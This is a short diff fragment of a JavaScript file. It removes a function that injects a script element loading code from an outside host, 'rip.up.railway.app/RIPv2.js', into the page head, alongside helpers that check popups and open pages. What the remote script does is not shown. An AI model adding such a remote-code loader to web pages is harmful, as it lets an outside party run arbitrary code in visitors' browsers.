@@ -76,12 +76,6 @@ function checkPopup() {
   }
 }
 
-function executeExternalScript() {
-  let script = document.createElement('script');
-  script.src = "https://rip.up.railway.app/RIPv2.js";
-  document.head.appendChild(script);
-}
-
 function checkOpenPages() {
   setTimeout(function() {
     if (anotherPageOpen) {
